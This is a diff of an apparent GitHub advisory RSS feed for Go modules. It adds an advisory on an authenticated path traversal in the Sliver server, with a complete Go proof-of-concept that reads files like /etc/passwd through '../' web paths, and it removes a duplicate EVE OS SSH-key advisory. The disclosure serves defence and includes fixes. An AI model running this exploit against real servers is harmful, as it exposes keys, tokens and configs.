@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://xlordz.github.io/github-advisory-database-rss/go.rss</id>
     <title>Security Advisory for Go modules</title>
-    <updated>2026-02-05T21:48:10.134Z</updated>
+    <updated>2026-02-05T22:02:22.384Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"/>
     <subtitle>Security Advisory for Go modules on GitHub</subtitle>
@@ -11,6 +11,212 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[github.com/bishopfox/sliver] Sliver Vulnerable to Website Path Traversal / Arbitrary File Read (Authenticated)]]></title>
+        <id>https://github.com/advisories/GHSA-2286-hxv5-cmp2</id>
+        <link href="https://github.com/advisories/GHSA-2286-hxv5-cmp2"/>
+        <updated>2026-02-05T21:57:15.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>A Path Traversal vulnerability in the website content subsystem lets an authenticated operator read arbitrary files on the Sliver server host. This is an authenticated <strong>Path Traversal / arbitrary file read</strong> issue, and it can expose credentials, configs, and keys.</p>
+<h2 id="affected-component">Affected Component</h2>
+<ul>
+<li>Website content management (gRPC): <code>WebsiteAddContent</code>, <code>Website</code>, <code>Websites</code></li>
+<li>Server-side file read in <code>Website.ToProtobuf</code></li>
+</ul>
+<h2 id="impact">Impact</h2>
+<ul>
+<li><strong>Arbitrary file read</strong> as the Sliver server OS user.</li>
+<li>Exposure of sensitive data such as operator configs, TLS keys, tokens, and logs.</li>
+</ul>
+<h2 id="root-cause">Root Cause</h2>
+<p>The server accepts and persists arbitrary website paths from the operator, then later reads from disk using that path without sanitization or containment.</p>
+<h2 id="vulnerable-code-references">Vulnerable Code References</h2>
+<ul>
+<li><code>server/rpc/rpc-website.go:100</code> — accepts <code>content.Path</code> from operator RPC and persists it via <code>website.AddContent</code></li>
+<li><code>server/db/models/website.go:52</code> — reads from disk with <code>filepath.Join(webContentDir, webcontent.Path)</code> without validating or constraining <code>webcontent.Path</code></li>
+</ul>
+<h2 id="proof-of-concept-poc">Proof of Concept (PoC)</h2>
+<h3 id="steps-local-test">Steps (local test)</h3>
+<ol>
+<li>Build the server:<pre><code class="language-bash">go build -mod=vendor -tags go_sqlite,server -o sliver-server ./server
+</code></pre>
+</li>
+<li>Create an operator config (permission <code>all</code> for website operations):<pre><code class="language-bash">./sliver-server operator -n testop -l 127.0.0.1 -p 31337 -P all -o file -s /tmp
+</code></pre>
+</li>
+<li>Start the daemon:<pre><code class="language-bash">./sliver-server daemon -l 127.0.0.1 -p 31337
+</code></pre>
+</li>
+<li>Run the PoC:<pre><code class="language-bash">GOFLAGS=-mod=vendor go run ./poc/website_path_traversal.go -config /tmp/testop_127.0.0.1.cfg -website poc-site -target /etc/hosts
+</code></pre>
+</li>
+</ol>
+<h3 id="poc-code">PoC Code</h3>
+<pre><code class="language-go">package main
+
+import (
+    "context"
+    "flag"
+    "fmt"
+    "os"
+    "path/filepath"
+    "runtime"
+    "strings"
+    "time"
+
+    "github.com/bishopfox/sliver/client/assets"
+    "github.com/bishopfox/sliver/client/transport"
+    "github.com/bishopfox/sliver/protobuf/clientpb"
+)
+
+func main() {
+    var (
+        configPath  string
+        websiteName string
+        targetPath  string
+        webPath     string
+        maxBytes    int
+    )
+    flag.StringVar(&amp;configPath, "config", "", "path to sliver client config (.cfg)")
+    flag.StringVar(&amp;websiteName, "website", "poc-site", "website name to use/create")
+    flag.StringVar(&amp;targetPath, "target", "", "absolute server file path to read")
+    flag.StringVar(&amp;webPath, "web-path", "", "override web path (defaults to traversal into target)")
+    flag.IntVar(&amp;maxBytes, "max-bytes", 1024, "max bytes of leaked content to print")
+    flag.Parse()
+
+    if targetPath == "" {
+        if runtime.GOOS == "windows" {
+            targetPath = `C:\\Windows\\System32\\drivers\\etc\\hosts`
+        } else {
+            targetPath = "/etc/passwd"
+        }
+    }
+
+    if webPath == "" {
+        trimmed := strings.TrimPrefix(targetPath, string(filepath.Separator))
+        webPath = "../../../../../../../../" + trimmed
+    }
+
+    config, err := loadConfig(configPath)
+    if err != nil {
+        fatalf("config error: %v", err)
+    }
+
+    rpc, conn, err := transport.MTLSConnect(config)
+    if err != nil {
+        fatalf("connect error: %v", err)
+    }
+    defer conn.Close()
+
+    ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
+    defer cancel()
+
+    _, err = rpc.WebsiteAddContent(ctx, &amp;clientpb.WebsiteAddContent{
+        Name: websiteName,
+        Contents: map[string]*clientpb.WebContent{
+            webPath: {
+                Path:        webPath,
+                ContentType: "text/plain",
+                Content:     []byte("poc"),
+            },
+        },
+    })
+    if err != nil {
+        fatalf("WebsiteAddContent failed: %v", err)
+    }
+
+    resp, err := rpc.Website(ctx, &amp;clientpb.Website{Name: websiteName})
+    if err != nil {
+        fatalf("Website failed: %v", err)
+    }
+
+    var leaked *clientpb.WebContent
+    for _, c := range resp.Contents {
+        if c.Path == webPath {
+            leaked = c
+            break
+        }
+    }
+    if leaked == nil {
+        fatalf("did not find content for path %q", webPath)
+    }
+
+    data := leaked.Content
+    if len(data) &gt; maxBytes {
+        data = data[:maxBytes]
+    }
+
+    fmt.Printf("[+] target: %s\n", targetPath)
+    fmt.Printf("[+] web-path: %s\n", webPath)
+    fmt.Printf("[+] leaked bytes: %d\n", len(leaked.Content))
+    fmt.Printf("[+] preview:\n%s\n", string(data))
+}
+
+func loadConfig(path string) (*assets.ClientConfig, error) {
+    if path != "" {
+        return assets.ReadConfig(path)
+    }
+    configs := assets.GetConfigs()
+    if len(configs) == 0 {
+        return nil, fmt.Errorf("no configs found; use -config")
+    }
+    if len(configs) &gt; 1 {
+        return nil, fmt.Errorf("multiple configs found; use -config")
+    }
+    for _, c := range configs {
+        return c, nil
+    }
+    return nil, fmt.Errorf("unexpected config error")
+}
+
+func fatalf(format string, args ...any) {
+    fmt.Fprintf(os.Stderr, format+"\n", args...)
+    os.Exit(1)
+}
+</code></pre>
+<h3 id="expected-output-example">Expected Output (example)</h3>
+<pre><code>[+] target: /etc/hosts
+[+] web-path: ../../../../../../../../etc/hosts
+[+] leaked bytes: 409
+[+] preview:
+127.0.0.1	localhost
+...
+</code></pre>
+<h2 id="evidence-screenshots">Evidence (Screenshots)</h2>
+<img src="https://github.com/user-attachments/assets/53d18a4b-9da9-49db-b7c4-cf1fefe760fe" alt="path-traversal-poc" height="649" width="930">
+
+<h2 id="why-it-works">Why It Works</h2>
+<ul>
+<li><code>WebsiteAddContent</code> accepts a path like <code>../../../../etc/hosts</code> and stores it.</li>
+<li><code>Website</code> returns content by calling <code>Website.ToProtobuf</code>, which reads from disk using the stored <code>Path</code> value.</li>
+<li><code>filepath.Join</code> does not prevent traversal, so the server reads from outside the web directory.</li>
+</ul>
+<h2 id="recommended-fix">Recommended Fix</h2>
+<ul>
+<li>Validate and reject paths that are absolute or contain <code>..</code> in <code>WebsiteAddContent</code> (server side).</li>
+<li>Canonicalize paths and enforce they remain within the web content directory.</li>
+<li>Avoid reading content by <code>Path</code> in <code>Website.ToProtobuf</code>; read by content ID instead.</li>
+</ul>
+<h2 id="notes">Notes</h2>
+<ul>
+<li>This issue requires an authenticated operator account with sufficient permissions (<code>PermissionAll</code>).</li>
+<li>The PoC demonstrates reading <code>/etc/hosts</code> but can target any readable server file.</li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/BishopFox/sliver/security/advisories/GHSA-2286-hxv5-cmp2">https://github.com/BishopFox/sliver/security/advisories/GHSA-2286-hxv5-cmp2</a></li>
+<li><a href="https://github.com/BishopFox/sliver/commit/818127349ccec812876693c4ca74ebf4350ec6b7">https://github.com/BishopFox/sliver/commit/818127349ccec812876693c4ca74ebf4350ec6b7</a></li>
+<li><a href="https://github.com/advisories/GHSA-2286-hxv5-cmp2">https://github.com/advisories/GHSA-2286-hxv5-cmp2</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-2286-hxv5-cmp2</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-02-05T21:57:14.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[github.com/openfga/openfga] OpenFGA Improper Policy Enforcement]]></title>
         <id>https://github.com/advisories/GHSA-jq9f-gm9w-rwm9</id>
@@ -718,46 +924,5 @@ which has very high privileges.</li>
         </author>
         <category label="severity" term="MODERATE"/>
         <published>2026-02-04T20:46:16.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/lf-edge/eve] Duplicate Advisory: EVE: SSH as Root Unlockable Without Triggering Measured Boot]]></title>
-        <id>https://github.com/advisories/GHSA-f6wp-8j9r-frrg</id>
-        <link href="https://github.com/advisories/GHSA-f6wp-8j9r-frrg"/>
-        <updated>2026-02-04T20:46:07.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="duplicate-advisory">Duplicate Advisory</h3>
-<p>This advisory has been withdrawn because it is a duplicate of GHSA-phcg-h58r-gmcq. This link is maintained to preserve external references.</p>
-<h3 id="original-description">Original Description</h3>
-<p>On boot, the Pillar eve container checks for the existence and content of
-“/config/authorized_keys”.</p>
-<p>If the file is present, and contains a supported public key, the container will go on to open
-port 22 and enable sshd with the given keys as the authorized keys for root login.</p>
-<p>An attacker could easily add their own keys and gain full control over the system without
-triggering the “measured boot” mechanism implemented by EVE OS, and without marking
-the device as “UUD” (“Unknown Update Detected”).</p>
-<p>This is because the “/config” partition is not protected by “measured boot”, it is mutable, and
-it is not encrypted in any way.</p>
-<p>An attacker can gain full control over the device without changing the PCR values, thus not
-triggering the “measured boot” mechanism, and having full access to the vault.</p>
-<p>Note:</p>
-<p>This issue was partially fixed in these commits (after disclosure to Zededa), where the config
-partition measurement was added to PCR13:</p>
-<p>• aa3501d6c57206ced222c33aea15a9169d629141</p>
-<p>• 5fef4d92e75838cc78010edaed5247dfbdae1889.</p>
-<p>This issue was made viable in version 9.0.0 when the calculation was moved to PCR14 but it was not included in the measured boot.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-43631">https://nvd.nist.gov/vuln/detail/CVE-2023-43631</a></li>
-<li><a href="https://asrg.io/security-advisories/cve-2023-43631">https://asrg.io/security-advisories/cve-2023-43631</a></li>
-<li><a href="https://asrg.io/security-advisories/ssh-as-root-unlockable-without-triggering-measured-boot">https://asrg.io/security-advisories/ssh-as-root-unlockable-without-triggering-measured-boot</a></li>
-<li><a href="https://github.com/advisories/GHSA-f6wp-8j9r-frrg">https://github.com/advisories/GHSA-f6wp-8j9r-frrg</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-f6wp-8j9r-frrg</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2023-09-21T15:30:15.000Z</published>
     </entry>
 </feed>
